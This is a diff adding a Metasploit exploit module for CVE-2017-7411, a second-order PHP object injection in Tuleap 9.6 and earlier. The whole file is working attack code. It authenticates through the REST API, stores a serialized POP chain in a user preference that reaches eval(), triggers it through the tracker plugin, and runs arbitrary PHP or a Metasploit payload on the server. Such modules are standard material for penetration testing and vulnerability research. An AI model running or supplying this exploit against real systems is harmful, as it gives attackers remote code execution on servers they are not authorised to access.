@@ -1,0 +1,184 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Tuleap 9.6 Second-Order PHP Object Injection',
+      'Description'    => %q{
+        This module exploits a Second-Order PHP Object Injection vulnerability in Tuleap <= 9.6 which
+        could be abused by authenticated users to execute arbitrary PHP code with the permissions of the
+        webserver. The vulnerability exists because of the User::getRecentElements() method is using the
+        unserialize() function with data that can be arbitrarily manipulated by a user through the REST
+        API interface. The exploit's POP chain abuses the __toString() method from the Mustache class
+        to reach a call to eval() in the Transition_PostActionSubFactory::fetchPostActions() method.
+      },
+      'Author'         => 'EgiX',
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['URL', 'http://karmainsecurity.com/KIS-2017-02'],
+          ['URL', 'https://tuleap.net/plugins/tracker/?aid=10118'],
+          ['CVE', '2017-7411']
+        ],
+      'Privileged'     => false,
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [ ['Tuleap <= 9.6', {}] ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Oct 23 2017'
+      ))
+
+      register_options(
+        [
+          OptString.new('TARGETURI', [true, "The base path to the web application", "/"]),
+          OptString.new('USERNAME', [true, "The username to authenticate with" ]),
+          OptString.new('PASSWORD', [true, "The password to authenticate with" ]),
+          OptInt.new('AID', [ false, "The Artifact ID you have access to", "1"]),
+          Opt::RPORT(443)
+        ])
+  end
+
+  def setup_popchain(random_param)
+    print_status("Trying to login through the REST API...")
+
+    user = datastore['USERNAME']
+    pass = datastore['PASSWORD']
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'api/tokens'),
+      'ctype'     => 'application/json',
+      'data'      => {'username' => user, 'password' => pass}.to_json
+    })
+
+    unless res && (res.code == 201 || res.code == 200) && res.body
+      msg = "Login failed with #{user}:#{pass}"
+      print_error(msg) if @is_check
+      fail_with(Failure::NoAccess, msg)
+    end
+
+    body  = JSON.parse(res.body)
+    uid   = body['user_id']
+    token = body['token']
+
+    print_good("Login successful with #{user}:#{pass}")
+    print_status("Updating user preference with POP chain string...")
+
+    php_code = "null;eval(base64_decode($_POST['#{random_param}']));//"
+
+    pop_chain =  'a:1:{i:0;a:1:{'
+    pop_chain << 's:2:"id";O:8:"Mustache":2:{'
+    pop_chain << 'S:12:"\00*\00_template";'
+    pop_chain << 's:42:"{{#fetchPostActions}}{{/fetchPostActions}}";'
+    pop_chain << 'S:11:"\00*\00_context";a:1:{'
+    pop_chain << 'i:0;O:34:"Transition_PostAction_FieldFactory":1:{'
+    pop_chain << 'S:23:"\00*\00post_actions_classes";a:1:{'
+    pop_chain << "i:0;s:#{php_code.length}:\"#{php_code}\";}}}}}}"
+
+    pref = {'id' => uid, 'preference' => {'key' => 'recent_elements', 'value' => pop_chain}}
+
+    res = send_request_cgi({
+      'method'    => 'PATCH',
+      'uri'       => normalize_uri(target_uri.path, "api/users/#{uid}/preferences"),
+      'ctype'     => 'application/json',
+      'headers'   => {'X-Auth-Token' => token, 'X-Auth-UserId' => uid},
+      'data'      => pref.to_json
+    })
+
+    unless res && res.code == 200
+      msg = "Something went wrong"
+      print_error(msg) if @is_check
+      fail_with(Failure::UnexpectedReply, msg)
+    end
+  end
+
+  def do_login
+    print_status("Retrieving the CSRF token for login...")
+
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, 'account/login.php')
+    })
+
+    if res && res.code == 200 && res.body && res.get_cookies
+      if res.body =~ /name="challenge" value="(\w+)">/
+        csrf_token = $1
+        print_good("CSRF token: #{csrf_token}")
+      else
+        print_warning("CSRF token not found. Trying to login without it...")
+      end
+    else
+      msg = "Failed to retrieve the login page"
+      print_error(msg) if @is_check
+      fail_with(Failure::NoAccess, msg)
+    end
+
+    user = datastore['USERNAME']
+    pass = datastore['PASSWORD']
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'cookie'    => res.get_cookies,
+      'uri'       => normalize_uri(target_uri.path, 'account/login.php'),
+      'vars_post' => {'form_loginname' => user, 'form_pw' => pass, 'challenge' => csrf_token}
+    })
+
+    unless res && res.code == 302
+      msg = "Login failed with #{user}:#{pass}"
+      print_error(msg) if @is_check
+      fail_with(Failure::NoAccess, msg)
+    end
+
+    print_good("Login successful with #{user}:#{pass}")
+    res.get_cookies
+  end
+
+  def exec_php(php_code)
+    random_param = rand_text_alpha(10)
+
+    setup_popchain(random_param)
+    session_cookies = do_login()
+
+    print_status("Triggering the POP chain...")
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, "plugins/tracker/?aid=#{datastore['AID']}"),
+      'cookie'    => session_cookies,
+      'vars_post' => {random_param => Rex::Text.encode_base64(php_code)}
+    })
+
+    if res && res.code == 200 && res.body =~ /Exiting with Error/
+      msg = "No access to Artifact ID #{datastore['AID']}"
+      @is_check ? print_error(msg) : fail_with(Failure::NoAccess, msg)
+    end
+
+    res
+  end
+
+  def check
+    @is_check = true
+    flag = rand_text_alpha(rand(10)+20)
+    res  = exec_php("print '#{flag}';")
+
+    if res && res.code == 200 && res.body =~ /#{flag}/
+      return Exploit::CheckCode::Vulnerable
+    elsif res && res.body =~ /Exiting with Error/
+      return Exploit::CheckCode::Unknown
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    @is_check = false
+    exec_php(payload.encoded)
+  end
+end
